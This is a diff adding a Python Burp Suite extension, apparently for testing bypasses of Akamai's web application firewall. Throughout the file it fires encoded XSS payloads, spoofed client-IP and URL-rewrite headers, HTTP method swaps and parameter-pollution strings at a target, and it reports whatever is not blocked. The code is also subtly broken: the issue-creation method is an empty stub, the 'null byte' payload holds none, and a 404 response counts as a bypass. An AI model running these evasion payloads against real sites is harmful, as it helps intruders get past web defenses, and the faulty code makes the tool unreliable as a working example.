@@ -1,0 +1,202 @@
+#!/usr/bin/env python
+# Advanced Akamai WAF Bypass Testing
+# Requires Burp Suite Professional
+
+from burp import IBurpExtender, IScannerCheck
+import random
+import string
+
+class AkamaiBypassTester(IBurpExtender, IScannerCheck):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Akamai Bypass Tester")
+        callbacks.registerScannerCheck(self)
+        print("Akamai Bypass Tester loaded!")
+        
+    def doActiveScan(self, baseRequestResponse, insertionPoint):
+        issues = []
+        
+        # Advanced encoding bypass techniques
+        issues.extend(self.test_encoding_bypass(baseRequestResponse, insertionPoint))
+        
+        # HTTP method tampering
+        issues.extend(self.test_method_tampering(baseRequestResponse, insertionPoint))
+        
+        # Header injection attacks
+        issues.extend(self.test_header_injection(baseRequestResponse, insertionPoint))
+        
+        # Parameter pollution
+        issues.extend(self.test_parameter_pollution(baseRequestResponse, insertionPoint))
+        
+        return issues if issues else None
+    
+    def test_encoding_bypass(self, baseRequestResponse, insertionPoint):
+        issues = []
+        
+        # Various encoding techniques
+        test_payloads = [
+            # URL encoding
+            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+            # Double URL encoding
+            "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+            # HTML entities
+            "&lt;script&gt;alert(1)&lt;/script&gt;",
+            # Unicode encoding
+            "\u003cscript\u003ealert(1)\u003c/script\u003e",
+            # Hex encoding
+            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+            # Mixed case
+            "<ScRiPt>alert(1)</ScRiPt>",
+            # Null bytes
+            "<script>alert(1)</script>",
+            # Tab characters
+            "<script>\talert(1)\t</script>",
+            # Newline characters
+            "<script>\nalert(1)\n</script>"
+        ]
+        
+        for payload in test_payloads:
+            test_request = self.create_test_request(baseRequestResponse, insertionPoint, payload)
+            test_response = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), test_request)
+            
+            if not self.is_waf_blocked(test_response):
+                issue = self.create_issue(
+                    baseRequestResponse,
+                    test_response,
+                    "Potential WAF Bypass - Encoding",
+                    "Payload bypassed WAF detection: {}".format(payload),
+                    "High"
+                )
+                issues.append(issue)
+                
+        return issues
+    
+    def test_method_tampering(self, baseRequestResponse, insertionPoint):
+        issues = []
+        
+        original_request = baseRequestResponse.getRequest()
+        request_info = self._helpers.analyzeRequest(original_request)
+        original_method = request_info.getMethod()
+        
+        # Alternative HTTP methods
+        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
+        
+        for method in methods:
+            if method != original_method:
+                modified_request = self._helpers.buildHttpMessage(
+                    request_info.getHeaders(), 
+                    request_info.getBody() if method in ["POST", "PUT", "PATCH"] else None
+                )
+                modified_request = modified_request.replace(
+                    "{} ".format(original_method), "{} ".format(method), 1
+                )
+                
+                test_response = self._callbacks.makeHttpRequest(
+                    baseRequestResponse.getHttpService(), modified_request)
+                
+                if not self.is_waf_blocked(test_response):
+                    issue = self.create_issue(
+                        baseRequestResponse,
+                        test_response,
+                        "HTTP Method Tampering",
+                        "Alternative HTTP method {} bypassed WAF".format(method),
+                        "Medium"
+                    )
+                    issues.append(issue)
+                    
+        return issues
+    
+    def test_header_injection(self, baseRequestResponse, insertionPoint):
+        issues = []
+        
+        original_request = baseRequestResponse.getRequest()
+        request_info = self._helpers.analyzeRequest(original_request)
+        headers = list(request_info.getHeaders())
+        
+        # WAF bypass headers
+        bypass_headers = [
+            "X-Forwarded-For: 127.0.0.1",
+            "X-Real-IP: 127.0.0.1",
+            "X-Originating-IP: 127.0.0.1",
+            "X-Remote-IP: 127.0.0.1",
+            "X-Remote-Addr: 127.0.0.1",
+            "X-Client-IP: 127.0.0.1",
+            "True-Client-IP: 127.0.0.1",
+            "Client-IP: 127.0.0.1",
+            "X-Original-URL: /test",
+            "X-Rewrite-URL: /test"
+        ]
+        
+        for header in bypass_headers:
+            modified_headers = headers + [header]
+            modified_request = self._helpers.buildHttpMessage(modified_headers, request_info.getBody())
+            
+            test_response = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), modified_request)
+            
+            if not self.is_waf_blocked(test_response):
+                issue = self.create_issue(
+                    baseRequestResponse,
+                    test_response,
+                    "Header Injection Bypass",
+                    "Header injection bypassed WAF: {}".format(header),
+                    "Medium"
+                )
+                issues.append(issue)
+                
+        return issues
+    
+    def test_parameter_pollution(self, baseRequestResponse, insertionPoint):
+        issues = []
+        
+        # HPP techniques
+        hpp_payloads = [
+            "param=value&param=override",
+            "param[]=value1&param[]=value2",
+            "param=value&other=value&param=override"
+        ]
+        
+        for payload in hpp_payloads:
+            test_request = self.create_test_request(baseRequestResponse, insertionPoint, payload)
+            test_response = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), test_request)
+            
+            if not self.is_waf_blocked(test_response):
+                issue = self.create_issue(
+                    baseRequestResponse,
+                    test_response,
+                    "Parameter Pollution",
+                    "HPP technique bypassed WAF: {}".format(payload),
+                    "Medium"
+                )
+                issues.append(issue)
+                
+        return issues
+    
+    def create_test_request(self, baseRequestResponse, insertionPoint, payload):
+        request = baseRequestResponse.getRequest()
+        return insertionPoint.buildRequest(payload)
+    
+    def is_waf_blocked(self, response):
+        response_info = self._helpers.analyzeResponse(response)
+        status_code = response_info.getStatusCode()
+        
+        # Consider 200, 302, 301, etc. as potentially successful bypasses
+        if status_code in [200, 302, 301, 404]:
+            return False
+        return True
+    
+    def create_issue(self, baseRequestResponse, test_response, name, detail, severity):
+        # Implementation for creating scan issues
+        pass
+        
+    def doPassiveScan(self, baseRequestResponse):
+        return None
+        
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        if existingIssue.getIssueName() == newIssue.getIssueName():
+            return -1
+        return 0
